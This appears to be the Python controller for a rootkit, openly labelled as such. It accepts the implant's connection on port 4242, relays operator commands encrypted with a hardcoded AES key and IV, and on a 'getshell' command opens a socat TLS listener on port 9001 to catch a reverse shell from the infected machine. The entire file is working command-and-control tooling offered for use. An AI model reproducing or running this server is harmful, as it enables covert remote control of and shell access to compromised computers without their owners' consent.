import socket
import threading
import subprocess
import os
import shutil
import time
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# === AES Configuration ===
AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits
AES_BLOCK_SIZE = 16  # 128 bits in bytes

# === Server Configuration ===
HOST = '0.0.0.0'
PORT = 4242
STD_BUFFER_SIZE = 1024  # 16 KB

pause_event = threading.Event()
pause_event.set()


# === AES Encryption/Decryption with PKCS#7 padding ===
def aes_encrypt(plaintext):
	# Convert string to bytes if needed
	if isinstance(plaintext, str):
		data = plaintext.encode('utf-8')
	else:
		data = plaintext
	
	# Apply PKCS#7 padding
	padder = padding.PKCS7(algorithms.AES.block_size).padder()
	padded_data = padder.update(data) + padder.finalize()
	
	# Encrypt the padded data
	cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
	encryptor = cipher.encryptor()
	encrypted = encryptor.update(padded_data) + encryptor.finalize()
	return encrypted


def aes_decrypt(ciphertext):
	# Decrypt the data
	cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
	decryptor = cipher.decryptor()
	decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
	
	# Remove PKCS#7 padding
	unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
	unpadded = unpadder.update(decrypted_padded) + unpadder.finalize()
	
	# Convert to string
	result = unpadded.decode('utf-8', errors='ignore')
	
	return result

# === Send data to server ===

def send_to_server_raw(sock, data):
	# Encrypt the data
	data = aes_encrypt(data)

	# Define the maximum chunk size
	max_chunk_body_size = STD_BUFFER_SIZE - 5
	len_data = len(data)

	# Calculate the number of chunks needed
	nb_chunks_needed = len_data // max_chunk_body_size
	if len_data % max_chunk_body_size != 0:
		nb_chunks_needed += 1

	for i in range(nb_chunks_needed):
		# Calculate the actual size of the chunk
		current_chunk_size = max_chunk_body_size if i < nb_chunks_needed - 1 else len_data % max_chunk_body_size
		if current_chunk_size == 0:
			current_chunk_size = max_chunk_body_size  # Last chunk of maximum size

		# Build the chunk
		chunk = bytearray(STD_BUFFER_SIZE)
		chunk[0] = nb_chunks_needed  # Number of chunks
		chunk[1] = i  # Index of the current chunk
		chunk[2] = (current_chunk_size >> 8) & 0xFF  # Upper byte of the chunk size
		chunk[3] = current_chunk_size & 0xFF  # Lower byte of the chunk size
		chunk[4:4 + current_chunk_size] = data[i * max_chunk_body_size: (i + 1) * max_chunk_body_size]  # Chunk data
		chunk[4 + current_chunk_size] = 0x04  # End-of-transmission byte

		# Send the chunk
		try:
			sock.sendall(chunk)
		except socket.error as e:
			print(f"send_to_server_raw: failed to send message (chunk {i}): {e}")
			return False

	return True


def receive_from_server_raw(sock):
	total_received = 0
	nb_chunks_needed = 0
	received_chunks = []
	buffer = bytearray()

	while True:
		# Receive a chunk
		chunk = sock.recv(STD_BUFFER_SIZE)
		if not chunk:
			print("receive_from_server: failed to receive data or connection closed")
			return False

		# Extract chunk information
		total_chunks = chunk[0]
		chunk_index = chunk[1]
		chunk_data_len = (chunk[2] << 8) | chunk[3]
		chunk_data = chunk[4:4 + chunk_data_len]

		# Check end-of-transmission
		if chunk[4 + chunk_data_len] != 0x04:
			print(f"receive_from_server: invalid end of transmission (chunk {chunk_index})")
			return False

		# Initialize structure if this is the first reception
		if nb_chunks_needed == 0:
			nb_chunks_needed = total_chunks
			received_chunks = [False] * nb_chunks_needed

		# Check for duplicates
		if received_chunks[chunk_index]:
			print(f"receive_from_server: duplicate chunk received (chunk {chunk_index})")
			return False

		# Mark this chunk as received
		received_chunks[chunk_index] = True

		# Append data to the buffer
		buffer.extend(chunk_data)
		total_received += chunk_data_len

		# Check if all chunks have been received
		if all(received_chunks):
			break

	result = bytes(buffer)

	# Decrypt the data
	decrypted = aes_decrypt(result)

	return decrypted

# === Optional: launch a shell via socat ===
def run_socat_shell():
	terminal_cmd = None

	if shutil.which("gnome-terminal"):
		terminal_cmd = [
			"gnome-terminal",
			"--",
			"bash",
			"-c",
			"socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
		]
	elif shutil.which("xterm"):
		terminal_cmd = [
			"xterm",
			"-e",
			"bash -c 'socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
		]
	elif shutil.which("konsole"):
		terminal_cmd = [
			"konsole",
			"-e",
			"bash",
			"-c",
			"socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
		]
	else:
		print("❌ [!] No compatible terminal found.")
		return

	try:
		subprocess.Popen(terminal_cmd)
		print("🚀 [*] Terminal launched with socat on port 9001.")
	except Exception as e:
		print(f"💥 [!] Error launching socat: {e}")


# === Main server logic ===
import string
def start_server():
	while True:
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_socket.bind((HOST, PORT))
		server_socket.listen(1)

		print(f"📡 [*] Waiting for a connection on {HOST}:{PORT}...")

		connection, addr = server_socket.accept()
		print(f"✅ [+] Rootkit connected from {addr[0]}")

		send_result = {}

		# === Thread for sending commands ===
		def send_commands():
			session = PromptSession("🧠 You > ")
			with patch_stdout():
				while True:
					try:
						line = session.prompt().strip()
						if not line:
							continue

						# Command: Launch reverse shell
						if line.lower() == "getshell":
							threading.Thread(target=run_socat_shell).start()
							time.sleep(1)

						# Encrypt and send
						to_send = line + "\n"
						send_to_server_raw(connection, to_send)

						if line.lower() == "killcom":
							print("❌ [-] Complete shutdown requested by the user.")
							return 'shutdown'

					except (KeyboardInterrupt, EOFError):
						print("\n⚠️ [!] User interruption. Closing...")
						break
					except Exception as e:
						print(f"💥 [!] Error sending: {e}")
						break

		# === Thread for receiving responses ===
		def receive_responses():
			while True:
					received = receive_from_server_raw(connection);
					print(f"🔒 [*] Received: {received}")

		def wrapped_send_commands():
			result = send_commands()
			send_result['status'] = result

		send_thread = threading.Thread(target=wrapped_send_commands, daemon=True)
		receive_thread = threading.Thread(target=receive_responses, daemon=True)

		send_thread.start()
		receive_thread.start()

		send_thread.join()

		connection.close()
		server_socket.close()
		print("🔒 [*] Connection closed. Server stopped.")

		if send_result.get('status') == 'shutdown':
			print("🛑 [*] Global program shutdown.")
			break

# === Entry point ===
if __name__ == '__main__':
	start_server()